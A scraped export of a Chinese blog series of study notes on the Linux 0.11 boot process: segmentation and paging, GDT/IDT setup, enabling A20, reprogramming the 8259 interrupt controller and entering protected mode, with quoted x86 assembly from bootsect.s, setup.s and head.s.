分段机制在之前几回已经讨论过多次了，其目的是为了为每个程序或任务提供单独的代码段（cs）、数据段（ds）、栈段（ss），使其不会相互干扰。 分页机制是本回讲的内容，开机后分页机制默认是关闭状态，需要我们手动开启，并且设置好页目录表（PDE）和页表（PTE）。其目的在于可以按需使用物理内存，同时也可以在多任务时起到隔离的作用，这个在后面将多任务时将会有所体会。 在 Intel 的保护模式下，分段机制是没有开启和关闭一说的，它必须存在，而分页机制是可以选择开启或关闭的。所以如果有人和你说，它实现了一个没有分段机制的操作系统，那一定是个外行。 再说说那些地址： 逻辑地址：我们程序员写代码时给出的地址叫逻辑地址，其中包含段选择子和偏移地址两部分。 线性地址：通过分段机制，将逻辑地址转换后的地址，叫做线性地址。而这个线性地址是有个范围的，这个范围就叫做线性地址空间，32 位模式下，线性地址空间就是 4G。 物理地址：就是真正在内存中的地址，它也是有范围的，叫做物理地址空间。那这个范围的大小，就取决于你的内存有多大了。 虚拟地址：如果没有开启分页机制，那么线性地址就和物理地址是一一对应的，可以理解为相等。如果开启了分页机制，那么线性地址将被视为虚拟地址，这个虚拟地址将会通过分页机制的转换，最终转换成物理地址。 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:2","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"扩展资料 关于逻辑地址-线性地址-物理地址的转换，可以参考 Intel 手册： Intel 3A Chapter 3 Protected-Mode Memory Management 而有关这些地址的定义和说明，在本小节中也做了详细的说明，看这里的介绍是最权威也是最透彻的。相信我，它很简单。 页目录表和页表的具体结构，可以看 Intel 3A Chapter 4.3 32-bit paging ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:3","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第八回 Intel内存管理两板斧：分段与分页 ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第五篇","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professional本文是Linux 0.11系列学习记录的正式的第五篇。 ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"08 重新设置 idt 和 gdt 书接上回，上回书咱们说到，CPU 进入了 32 位保护模式，我们快速回顾一下关键的代码。 首先配置了全局描述符表 gdt 和中断描述符表 idt。 lidt idt_48 lgdt gdt_48 然后打开了 A20 地址线。 mov al,#0xD1 ; command write out #0x64,al mov al,#0xDF ; A20 on out #0x60,al 然后更改 cr0 寄存器开启保护模式。 mov ax,#0x0001 lmsw ax 最后，一个干脆利落的跳转指令，跳到了内存地址 0 处开始执行代码。 jmpi 0,8 0 位置处存储着操作系统全部核心代码，是由 head.s 和 main.c 以及后面的无数源代码文件编译并链接在一起而成的 system 模块。 接下来看下在正式进入 c 语言写的 main.c 之前的 head.s 究竟写了点啥？ ; head.s _pg_dir: ; 页目录存放在这里 _startup_32: ; 以下5行设置各个数据段寄存器，指向 gdt 数据段描述符项 mov eax,0x10 mov ds,ax mov es,ax mov fs,ax mov gs,ax lss esp,_stack_start ; 表示_stack_start -\u003e ss:esp，设置系统堆栈。 注意到开头有个标号 _pg_dir，这个表示页目录，之后在设置分页机制时，页目录会存放在这里，也会覆盖这里的代码。 再往下连续五个 mov 操作，分别给 ds、es、fs、gs 这几个段寄存器赋值为 0x10，根据段描述符结构解析，表示这几个段寄存器的值为指向全局描述符表中的第二个段描述符，也就是数据段描述符。（这里我们可能在后续进行源码阅读的时候会进一步深入，这里作者分析的有点简单，可能很多读者看不懂。） 最后 lss 指令相当于让 ss:esp 这个栈顶指针指向了 _stack_start 这个标号的位置。还记得图里的那个原来的栈顶指针在哪里吧？往上翻一下，0x9FF00，现在要变咯。 这个 stack_start 标号定义在了很久之后才会讲到的 sched.c 里，我们这里拿出来分析一波。 long user_stack[4096 \u003e\u003e 2]; struct { long *a; short b; } stack_start = {\u0026user_stack[4096 \u003e\u003e 2], 0x10}; 首先，stack_start 结构中的高位 8 字节是 0x10，将会赋值给 ss 栈段寄存器，低位 16 字节是 user_stack 这个数组的最后一个元素的地址值，将其赋值给 esp 寄存器。 赋值给 ss 的 0x10 仍然按照保护模式下的段选择子去解读，其指向的是全局描述符表中的第二个段描述符（数据段描述符），段基址是 0。 赋值给 esp 寄存器的就是 user_stack 数组的最后一个元素的内存地址值，那最终的栈顶地址，也指向了这里（user_stack + 0），后面的压栈操作，就是往这个新的栈顶地址处压咯。 继续往下看 call setup_idt ;设置中断描述符表 call setup_gdt ;设置全局描述符表 mov eax,10h mov ds,ax mov es,ax mov fs,ax mov gs,ax lss esp,_stack_start 先设置了 idt 和 gdt，然后又重新执行了一遍刚刚执行过的代码。 为什么要重新设置这些段寄存器呢？因为上面修改了 gdt，所以要重新设置一遍以刷新才能生效。那我们接下来就把目光放到设置 idt 和 gdt 上。中断描述符表 idt 我们之前没设置过，所以这里设置具体的值，理所应当。 setup_idt: lea edx,ignore_int mov eax,00080000h mov ax,dx mov dx,8E00h lea edi,_idt mov ecx,256 rp_sidt: mov [edi],eax mov [edi+4],edx add edi,8 dec ecx jne rp_sidt lidt fword ptr idt_descr ret idt_descr: dw 256*8-1 dd _idt _idt: DQ 256 dup(0) 不用细看，我给你说最终效果。 中断描述符表 idt 里面存储着一个个中断描述符，每一个中断号就对应着一个中断描述符，而中断描述符里面存储着主要是中断程序的地址，这样一个中断号过来后，CPU 就会自动寻找相应的中断程序，然后去执行它。 那这段程序的作用就是，设置了 256 个中断描述符，并且让每一个中断描述符中的中断程序例程都指向一个 ignore_int 的函数地址，这个是个默认的中断处理程序，之后会逐渐被各个具体的中断程序所覆盖。比如之后键盘模块会将自己的键盘中断处理程序，覆盖过去。 那现在，产生任何中断都会指向这个默认的函数 ignore_int，也就是说现在这个阶段你按键盘还不好使。 设置中断描述符表 setup_idt 说完了，那接下来 setup_gdt 就同理了。我们就直接看设置好后的新的全局描述符表长什么样吧？ _gdt: DQ 0000000000000000h ;/* NULL descriptor */ DQ 00c09a0000000fffh ;/* 16Mb */ DQ 00c0920000000fffh ;/* 16Mb */ DQ 0000000000000000h ;/* TEMPORARY - don't use */ DQ 252 dup(0) 其实和我们原先设置好的 gdt 一模一样。 也是有代码段描述符和数据段描述符，然后第四项系统段描述符并没有用到，不用管。最后还留了 252 项的空间，这些空间后面会用来放置任务状态段描述符 TSS 和局部描述符 LDT，这个后面再说。 为什么原来已经设置过一遍了，这里又要重新设置一遍，你可千万别想有什么复杂的原因，就是因为原来设置的 gdt 是在 setup 程序中，之后这个地方要被缓冲区覆盖掉，所以这里重新设置在 head 程序中，这块内存区域之后就不会被其他程序用到并且覆盖了，就这么个事。 说的口干舌燥，还是来张图吧。 如果你本文的内容完全不能理解，那就记住最后这张图就好了，本文代码就是完成了这个图中所示的一个指向转换而已，并且给所有中断设置了一个默认的中断处理程序 ignore_int，然后全局描述符表仍然只有代码段描述符和数据段描述符。 好了，本文就是两个描述符表位置的变化以及重新设置，再后面一行代码就是又一个令人兴奋的功能了！ jmp after_page_tables ... after_page_tables: push 0 push 0 push 0 push L6 push _main jmp setup_paging L6: jmp L6 那就是开启分页机制，并且跳转到 main 函数！ 这可太令人兴奋了！开启分页后，配合着之前讲的分段，就构成了内存管理的最最底层的机制。而跳转到 main 函数，标志着我们正式进入 c 语言写的操作系统核心代码！ ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第八回 烦死了又要重新设置一遍idt和gdt ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第四篇","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"Linux-0.11-04 本文是Linux 0.11系列学习记录的正式的第四篇。 ","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"07 六行代码就进入了保护模式 书接上回，上回书咱们说到，操作系统设置了个全局描述符表 gdt。 为后面切换到保护模式后，能去那里寻找到段描述符，然后拼凑成最终的物理地址。 而此时我们的内存布局变成了这个样子。 这仅仅是进入保护模式前准备工作的其中一个，我们接着往下看。代码仍然是 setup.s 中的。 mov al,#0xD1 ; command write out #0x64,al mov al,#0xDF ; A20 on out #0x60,al 这段代码的意思是，打开 A20 地址线。什么是 A20 地址线呢？ 简单理解，这一步就是为了突破地址信号线 20 位的宽度，变成 32 位可用。这是由于 8086 CPU 只有 20 位的地址线，所以如果程序给出 21 位的内存地址数据，那多出的一位就被忽略了，比如如果经过计算得出一个内存地址为 1 0000 00000000 00000000 ，那实际上内存地址相当于 0，因为高位的那个 1 被忽略了，位数不够。 当 CPU 到了 32 位时代之后，由于要考虑兼容性，还必须保持一个只能用 20 位地址线的模式，所以如果你不手动开启的话，即使地址线已经有 32 位了，仍然会限制只能使用其中的 20 位。 接下来的一段代码，你完全完全不用看，但为了防止你一直记挂在心上，我给你截出来说道说道，这样以后我说完全不用看的代码时，你就真的可以放宽心完全不看了。 就是这一大坨，还有 Linus 自己的注释。 ; well, that went ok, I hope. Now we have to reprogram the interrupts :-( ; we put them right after the intel-reserved hardware interrupts, at ; int 0x20-0x2F. There they won't mess up anything. Sadly IBM really ; messed this up with the original PC, and they haven't been able to ; rectify it afterwards. Thus the bios puts interrupts at 0x08-0x0f, ; which is used for the internal hardware interrupts as well. We just ; have to reprogram the 8259's, and it isn't fun. mov al,#0x11 ; initialization sequence out #0x20,al ; send it to 8259A-1 .word 0x00eb,0x00eb ; jmp $+2, jmp $+2 out #0xA0,al ; and to 8259A-2 .word 0x00eb,0x00eb mov al,#0x20 ; start of hardware int's (0x20) out #0x21,al .word 0x00eb,0x00eb mov al,#0x28 ; start of hardware int's 2 (0x28) out #0xA1,al .word 0x00eb,0x00eb mov al,#0x04 ; 8259-1 is master out #0x21,al .word 0x00eb,0x00eb mov al,#0x02 ; 8259-2 is slave out #0xA1,al .word 0x00eb,0x00eb mov al,#0x01 ; 8086 mode for both out #0x21,al .word 0x00eb,0x00eb out #0xA1,al .word 0x00eb,0x00eb mov al,#0xFF ; mask off all interrupts for now out #0x21,al .word 0x00eb,0x00eb out #0xA1,al 这里是对可编程中断控制器 8259 芯片进行的编程。 因为 中断号是不能冲突的， Intel 把 0 到 0x19 号中断都作为保留中断，比如 0 号中断就规定为除零异常，软件自定义的中断都应该放在这之后，但是 IBM 在原 PC 机中搞砸了，跟保留中断号发生了冲突，以后也没有纠正过来，所以我们得重新对其进行编程，不得不做，却又一点意思也没有。这是 Linus 在上面注释上的原话。 所以我们也不必在意，只要知道重新编程之后，8259 这个芯片的引脚与中断号的对应关系，变成了如下的样子就好。 PIC请求号 中断号 用途 IRQ0 0x20 时钟中断 IRQ1 0x21 键盘中断 IRQ2 0x22 接连从芯片 IRQ3 0x23 串口2 IRQ4 0x24 串口1 IRQ5 0x25 并口2 IRQ6 0x26 软盘驱动器 IRQ7 0x27 并口1 IRQ8 0x28 实时钟中断 IRQ9 0x29 保留 IRQ10 0x2a 保留 IRQ11 0x2b 保留 IRQ12 0x2c 鼠标中断 IRQ13 0x2d 数学协处理器 IRQ14 0x2e 硬盘中断 IRQ15 0x2f 保留 好了，接下来的一步，就是真正切换模式的一步了，从代码上看就两行。 mov ax,#0x0001 ; protected mode (PE) bit lmsw ax ; This is it; jmpi 0,8 ; jmp offset 0 of segment 8 (cs), execute system code 前两行，将 cr0 这个寄存器的位 0 置 1，模式就从实模式切换到保护模式了。 所以真正的模式切换十分简单，重要的是之前做的准备工作。 再往后，又是一个段间跳转指令 jmpi，后面的 8 表示 cs（代码段寄存器）的值，0 表示偏移地址。请注意，此时已经是保护模式了，之前也说过，保护模式下内存寻址方式变了，段寄存器里的值被当做段选择子。 回顾下段选择子的模样。 8 用二进制表示就是 00000,0000,0000,1000 , 对照上面段选择子的结构，可以知道描述符索引值是 1，也就是要去全局描述符表（gdt）中找第一项段描述符。 还记得上一讲中的全局描述符的具体内容么？ gdt: .word 0,0,0,0 ; dummy.word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9A00 ; code read/exec .word 0x00C0 ; granularity=4096, 386 .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9200 ; data read/write .word 0x00C0 ; granularity=4096, 386 我们说了，第 0 项是空值，第一项被表示为代码段描述符，是个可读可执行的段，第二项为数据段描述符，是个可读可写段，不过他们的段基址都是 0。 所以，这里取的就是这个代码段描述符，段基址是 0，偏移也是 0，那加一块就还是 0 咯，所以最终这个跳转指令，就是跳转到内存地址的 0 地址处，开始执行。 零地址处是什么呢？还是回顾之前的内存布局图。 就是操作系统全部代码的 system 这个大模块，system 模块怎么生成的呢？由 Makefile 文件可知，是由 head.s 和 main.c 以及其余各模块的操作系统代码合并来的，可以理解为操作系统的全部核心代码编译后的结果。 tools/system: boot/head.o init/main.o \\ $(ARCHIVES) $(DRIVERS) $(MATH) $(LIBS) $(LD) $(LDFLAGS) boot/head.o init/main.o \\ $(ARCHIVES) \\ $(DRIVERS) \\ $(MATH) \\ $(LIBS) \\ -o tools/system \u003e System.map 所以，接下来，我们就要重点阅读 head.s 了。 这也是 boot 文件夹下的最后一个由汇编写就的源代码文件，哎呀，不知不觉就把两个操作系统源码文件（bootsect.s 和 setup.s）讲完了，而且是汇编写的令人头疼的代码。 head.s 这个文件仅仅是为了顺利进入由后面的 c 语言写就的 main.c 做的准备，所以咬咬牙看完这个之后，我们就终于可以进入 c 语言的世界了！也终于可以看到我们熟悉的 main 函数了！ 在那里，操作系统真正秀操作的地方，才刚刚开始！欲知后事如何，且听下回分解。 ——- 本回扩展资料 ——- 保护模式下逻辑地址到线性地址（不开启分页时就是物理地址）的转化，看 Intel 手册： Volume 3 Chapter 3.4 Logical And Linear Addresses 段描述符结构和详细说明，看 Intel 手册： Volume 3 Chapter 3.4.5 Segment Descriptors 对操作系统如何编译的，比如好奇那个 system 是怎么来的，可以尝试理解一下 Linux 0.11 源码中的 Makefile，","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第六回 六行代码就进入了保护模式 ","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第三篇","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"Linux-0.11-03 本文是Linux 0.11系列学习记录的正式的第三篇。 ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"06 先解决段寄存器的历史包袱问题 书接上回，上回书咱们说到，操作系统又折腾了一下内存，之后的很长一段时间内存布局就不会变了，终于稳定下来了，目前内部形式如下。 0 地址开始处存放着操作系统的全部代码，也就是 system 模块，0x90000 位置处往后的几十个字节存放着一些设备的信息，方便以后使用。 内存地址 长度(字节) 名称 0x90000 2 光标位置 0x90002 2 扩展内存数 0x90004 2 显示页面 0x90006 1 显示模式 0x90007 1 字符列数 0x90008 2 未知 0x9000A 1 显示内存 0x9000B 1 显示状态 0x9000C 2 显卡特性参数 0x9000E 1 屏幕行数 0x9000F 1 屏幕列数 0x90080 16 硬盘1参数表 0x90090 16 硬盘2参数表 0x901FC 2 根设备号 这里的内存布局十分清晰，主要是方便后续操作系统的大显身手。接下来就要模式的转换，需要从现在的 16 位的实模式转变为之后 32 位的保护模式。 从业务来讲，这本应是比较复杂的一部分内容，难度较高，但从代码量看，却是少得可怜。 从 16 位的实模式到 32 位保护模式的转换是 x86 的历史包袱问题，现在的 CPU 几乎都是支持 32 位模式甚至 64 位模式了，很少有还仅仅停留在 16 位的实模式下的 CPU。所以我们要为了这个历史包袱，写一段模式转换的代码，如果 Intel CPU 被重新设计而不用考虑兼容性，那么今天的代码将会减少很多甚至不复存在。 这里仍然是 setup.s 文件中的代码: lidt idt_48 ; load idt with 0,0 lgdt gdt_48 ; load gdt with whatever appropriate idt_48: .word 0 ; idt limit=0 .word 0,0 ; idt base=0L 要理解这两条指令，就涉及到实模式和保护模式的第一个区别。我们现在还处于实模式下，这个模式的 CPU 计算物理地址的方式还记得么？不记得的话看一下 第一回 最开始的两行代码。 就是段基址左移四位，再加上偏移地址。比如： 当 CPU 切换到保护模式后，同样的代码，内存地址的计算方式发生了改变。刚刚 ds 寄存器里存储的值，在实模式下叫做段基址，在保护模式下叫段选择子。段选择子里存储着段描述符的索引。 通过段描述符索引，可以从全局描述符表 gdt 中找到一个段描述符，段描述符里存储着段基址。 段基址取出来，再和偏移地址相加，就得到了物理地址，整个过程如下。 总结一下就是，段寄存器（比如 ds、ss、cs）里存储的是段选择子，段选择子去全局描述符表中寻找段描述符，从中取出段基址。 好了，全局描述符表（gdt）长什么样？它在哪？怎么让 CPU 知道它在哪？ 先说说它在哪？在内存中呗，那么怎么告诉 CPU 全局描述符表（gdt）在内存中的什么位置呢？答案是由操作系统把这个位置信息存储在一个叫 gdtr 的寄存器中。 怎么存呢？就是刚刚那条指令。 lgdt gdt_48 其中 lgdt 就表示把后面的值（gdt_48）放在 gdtr 寄存器中，gdt_48 标签，我们看看它长什么样。 gdt_48: .word 0x800 ; gdt limit=2048, 256 GDT entries .word 512+gdt,0x9 ; gdt base = 0X9xxxx 可以看到这个标签位置处表示一个 48 位的数据，其中高 32 位存储着的正是全局描述符表 gdt 的内存地址 0x90200 + gdt。 gdt 是个标签，表示在本文件内的偏移量，而本文件是 setup.s，编译后是放在 0x90200 这个内存地址的，所以要加上 0x90200 这个值。 那 gdt 这个标签处，就是全局描述符表在内存中的真正数据了。 gdt: .word 0,0,0,0 ; dummy .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9A00 ; code read/exec .word 0x00C0 ; granularity=4096, 386 .word 0x07FF ; 8Mb - limit=2047 (2048*4096=8Mb) .word 0x0000 ; base address=0 .word 0x9200 ; data read/write .word 0x00C0 ; granularity=4096, 386 根据刚刚的段描述符格式。 可以看出目前全局描述符表有三个段描述符，第一个为空，第二个是代码段描述符（type=code），第三个是数据段描述符（type=data），第二个和第三个段描述符的段基址都是 0，也就是之后在逻辑地址转换物理地址的时候，通过段选择子查找到无论是代码段还是数据段，取出的段基址都是 0，那么物理地址将直接等于程序员给出的逻辑地址（准确说是逻辑地址中的偏移地址）。 具体段描述符的细节还有很多，就不展开了，比如这里的高 22 位就表示它是代码段还是数据段。 接下来我们看看目前的内存布局，还是别管比例。 这里我把 idtr 寄存器也画出来了，这个是中断描述符表，其原理和全局描述符表一样。全局描述符表是让段选择子去里面寻找段描述符用的，而中断描述符表是用来在发生中断时，CPU 拿着中断号去中断描述符表中寻找中断处理程序的地址，找到后就跳到相应的中断程序中去执行，具体我们后面遇到了再说。 好了，今天我们就讲，操作系统设置了个全局描述符表 gdt，为后面切换到保护模式后，能去那里寻找到段描述符，然后拼凑成最终的物理地址，就这个作用。当然，还有很多段描述符，作用不仅仅是转换成最终的物理地址，不过这是后话了。 这仅仅是进入保护模式前准备工作的其中一个，后面的路还长着呢。欲知后事如何，且听下回分解。 ——- 本回扩展资料 ——- 保护模式下逻辑地址到线性地址（不开启分页时就是物理地址）的转化，看 Intel 手册： Volume 3 Chapter 3.4 Logical And Linear Addresses 段描述符结构和详细说明，看 Intel 手册： Volume 3 Chapter 3.4.5 Segment Descriptors 比如文中说的数据段与代码段的划分，其实还有更细分的权限控制。 ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"原文地址 你管这破玩意叫操作系统源码 | 第六回 先解决段寄存器的历史包袱问题 ","date":"2021-12-11","objectID":"/2021/12/linux-0.11-03/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-03","uri":"/2021/12/linux-0.11-03/"},{"categories":["LINUX"],"content":"闪客Linux操作系统系列第二篇","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"Linux-0.11-02 本文是Linux 0.11系列学习记录的正式的第二篇。 ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"03 做好最最基础的准备工作 书接上回，上回书咱们说到，操作系统的代码最开头的 512 字节的数据，从硬盘的启动区先是被移动到了内存 0x7c00 处，然后又立刻被移动到 0x90000 处，并且跳转到此处往后再稍稍偏移 go 这个标签所代表的偏移地址处。 那我们接下来，就继续把我们的目光放在 go 这个标签的位置，跟着 CPU 的步伐往后看。 go: mov ax,cs mov ds,ax mov es,ax mov ss,ax mov sp,#0xFF00 全都是 mov 操作，那好办了。 这段代码的直接意思很容易理解，就是把 cs 寄存器的值分别复制给 ds、es 和 ss 寄存器，然后又把 0xFF00 给了 sp 寄存器。 回顾下 CPU 寄存器图。 cs 寄存器表示代码段寄存器，CPU 当前正在执行的代码在内存中的位置，就是由 cs:ip 这组寄存器配合指向的，其中 cs 是基址，ip 是偏移地址。 由于之前执行过一个段间跳转指令，还记得不？ jmpi go,0x9000 所以现在 cs 寄存器里的值就是 0x9000，ip 寄存器里的值是 go 这个标签的偏移地址。那这三个 mov 指令就分别给 ds、es 和 ss 寄存器赋值为了 0x9000。 ds 为数据段寄存器，之前我们说过了，当时它被复制为 0x07c0，是因为之前的代码在 0x7c00 处，现在代码已经被挪到了 0x90000 处，所以现在自然又改赋值为 0x9000 了。 es 是扩展段寄存器，仅仅是个扩展，不是主角，先不用理它。 ss 为栈段寄存器，后面要配合栈基址寄存器 sp 来表示此时的栈顶地址。而此时 sp 寄存器被赋值为了 0xFF00 了，所以目前的栈顶地址就是 ss:sp 所指向的地址 0x9FF00 处。 其实到这里，操作系统的一些最最最最基础的准备工作，就做好了。都做了些啥事呢？ 第一，代码从硬盘移到内存，又从内存挪了个地方，放在了 0x90000 处。 第二，数据段寄存器 ds 和代码段寄存器 cs 此时都被设置为了 0x9000，也就为跳转代码和访问内存数据，奠定了同一个内存的基址地址，方便了跳转和内存访问，因为仅仅需要指定偏移地址即可了。 第三，栈顶地址被设置为了 0x9FF00，具体表现为栈段寄存器 ss 为 0x9000，栈基址寄存器 sp 为 0xFF00。栈是向下发展的，这个栈顶地址 0x9FF00 要远远大于此时代码所在的位置 0x90000，所以栈向下发展就很难撞见代码所在的位置，也就比较安全。这也是为什么给栈顶地址设置为这个值的原因，其实只需要离代码的位置远远的即可。 做好这些基础工作后，接下来就又该折腾了其他事了。 总结拔高一下，这一部分其实就是把代码段寄存器 cs，数据段寄存器 ds，栈段寄存器 ss 和栈基址寄存器 sp 分别设置好了值，方便后续使用。 再拔高一下，其实操作系统在做的事情，就是给如何访问代码，如何访问数据，如何访问栈进行了一下内存的初步规划。其中访问代码和访问数据的规划方式就是设置了一个基址而已，访问栈就是把栈顶指针指向了一个远离代码位置的地方而已。 所以，千万别多想，就这么点事儿。那再给大家留个作业，把当前的内存布局画出来，告诉我现在 cs、ip、ds、ss、sp 这些寄存器的值，在内存布局中的位置。 好了，接下来我们应该干什么呢？我们回忆下，我们目前仅仅把硬盘中 512 字节加载到内存中了，但操作系统还有很多代码仍然在硬盘里，不能抛下他们不管呀。 所以你猜下一步要干嘛了？ 后面的世界越来越精彩，欲知后事如何，且听下回分解。 ——- 本回扩展与延伸 ——- 有关段寄存器的详细信息，可以参考 Intel 手册： Volume 1 Chapter 3.4.2 Segment Registers 其中有一张图清晰地描述了三种段寄存器的作用。 正如我们本回所涉及到的讲述一样，CS 是代码段寄存器，就是执行代码的时候带着这里存的基地址。DS 是数据段寄存器，就是访问数据的时候带着这里的基地址。SS 是栈段寄存器，就是访问栈时带着这里的基地址。 所以本回的代码，正如标题所说，就是做好最最基础的准备工作。但要从更伟大的战略意义上讲，它其实是按照 Intel 手册上要求的，老老实实把这三类段寄存器的值设置好，达到了初步规划内存的目的。 ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"04 把自己在硬盘里的其他部分也放到内存来 做好这些基础工作后，接下来就又该新的一翻折腾了，我们接着往下看。 load_setup: mov dx,#0x0000 ; drive 0, head 0 mov cx,#0x0002 ; sector 2, track 0 mov bx,#0x0200 ; address = 512, in 0x9000 mov ax,#0x0200+4 ; service 2, nr of sectors int 0x13 ; read it jnc ok_load_setup ; ok - continue mov dx,#0x0000 mov ax,#0x0000 ; reset the diskette int 0x13 jmp load_setup ok_load_setup: ... 这里有两个 int 指令我们还没见过。 注意这个 int 是汇编指令，可不是高级语言的整型变量哟。int 0x13 表示发起 0x13 号中断，这条指令上面给 dx、cx、bx、ax 赋值都是作为这个中断程序的参数。 中断是啥如果你不理解，先不要管，如果你就是放不下，那可以看一眼我之前的文章：认认真真的聊聊中断，里面讲得非常细致。 总之这个中断发起后，CPU 会通过这个中断号，去寻找对应的中断处理程序的入口地址，并跳转过去执行，逻辑上就相当于执行了一个函数。而 0x13 号中断的处理程序是 BIOS 提前给我们写好的，是读取磁盘的相关功能的函数。 之后真正进入操作系统内核后，中断处理程序是需要我们自己去重新写的，这个在后面的章节中，你会不断看到各个模块注册自己相关的中断处理程序，所以不要急。此时为了方便就先用 BIOS 提前给我们写好的程序了。 可见即便是操作系统的源码，有时也需要去调用现成的函数方便自己，并不是造轮子的人就非得完全从头造。 本段代码的注释已经写的很明确了，直接说最终的作用吧，就是将硬盘的第 2 个扇区开始，把数据加载到内存 0x90200 处，共加载 4 个扇区，图示其实就是这样。 为了图片清晰表达意思，可能比例就不那么严谨了，大家不必纠结。 可以看到，如果复制成功，就跳转到 ok_load_setup 这个标签，如果失败，则会不断重复执行这段代码，也就是重试。那我们就别管重试逻辑了，直接看成功后跳转的 ok_load_setup 这个标签后的代码。 ok_load_setup: ... mov ax,#0x1000 mov es,ax ; segment of 0x10000 call read_it ... jmpi 0,0x9020 这段代码省略了很多非主逻辑的代码，比如在屏幕上输出 Loading system … 这个字符串以防止用户等烦了。 剩下的主要代码就都写在这里了，就这么几行，其作用是把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处，和之前的从硬盘捣腾到内存是一个道理。 至此，整个操作系统的全部代码，就已经全部从硬盘中，被搬迁到内存来了。 然后又通过一个熟悉的段间跳转指令 jmpi 0,0x9020，跳转到 0x90200 处，就是硬盘第二个扇区开始处的内容。 那这里的内容是什么呢？先不急，我们借这个机会把整个操作系统的编译过程说下。整个编译过程，就是通过 Makefile 和 build.c 配合完成的，最终会： 1. 把 bootsect.s 编译成 bootsect 放在硬盘的 1 扇区。 2. 把 setup.s 编译成 setup 放在硬盘的 2~5 扇区。 3. 把剩下的全部代码（head.s 作为开头）编译成 system 放在硬盘的随后 240 个扇区。 所以整个路径就是这样的。 所以，我们即将跳转到的内存中的 0x90200 处的代码，就是从硬盘第二个扇区开始处加载到内存的。第二个扇区的最开始处，那也就是 setup.s 文件的第一行代码咯。 那这个代码是什么呢？我们后面再说，不过先打开 setup.s 这个文件看看吧。 start: mov ax,#0x9000 ; this is done in bootsect already, but... mov ds,ax mov ah,#0x03 ; read cursor pos xor bh,bh int 0x10 ; save it in known place, con_init fetches mov [0],dx ; it from 0x90000. ... 好了，到目前为止，你是不是觉得，我去，这前面编译放在硬盘的位置，和后面代码写死的跳转地址，竟然如此地强耦合？那万一整错了咋办。 是啊，就是这样，你以为呢？在操作系统刚刚开始建立的时候，那是完全自己安排前前后后的关系，一个字节都不能偏，就是这么强耦合，需要小心翼翼，需要大脑时刻保持清醒，规划好自己写的代码被编译并存储在硬盘的哪个位置，而随后又会被加载到内存的哪个位置，不能错乱。 但这也是很有好处的，那就是在这个阶段，你完完全全知道每一步跳转，每一步数据访问都是怎么设计和规划的，不存在黑盒。 不像我们在写高级语言的时候，完全不知道是怎么底层帮我们做了多少工作。虽然这解脱了程序员关心底层细节的烦恼，但在遇到问题或者想知道原理的时候，就显得很讨厌了。所以珍惜这个阶段吧！ 而且，你在上层之所以能那么随心所欲，很多底层细节完全不用考虑，很省心，正是因为像今天这样以及之后每一章的各种底层代码小心翼翼的做了很多铺垫。 